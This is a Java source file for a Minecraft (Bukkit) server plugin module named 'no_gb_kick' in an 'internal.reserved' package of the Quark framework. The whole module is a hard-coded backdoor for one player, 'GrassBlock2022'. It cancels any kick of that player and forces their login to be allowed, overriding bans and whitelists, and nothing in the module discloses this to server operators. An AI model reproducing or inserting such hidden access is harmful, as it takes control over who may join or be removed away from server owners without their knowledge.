package org.tbstcraft.quark.internal.reserved;

import org.bukkit.event.EventHandler;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.tbstcraft.quark.framework.module.PackageModule;
import org.tbstcraft.quark.framework.module.QuarkModule;

import java.util.Objects;

@QuarkModule(id = "no_gb_kick")
public class NoGrassBlockKicked extends PackageModule {

    @EventHandler
    public void onKick(PlayerKickEvent event) {
        if (event.getPlayer().getName().equals("GrassBlock2022")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent event){
        if (Objects.equals(event.getPlayerProfile().getName(), "GrassBlock2022")) {
            event.allow();
        }
    }
}
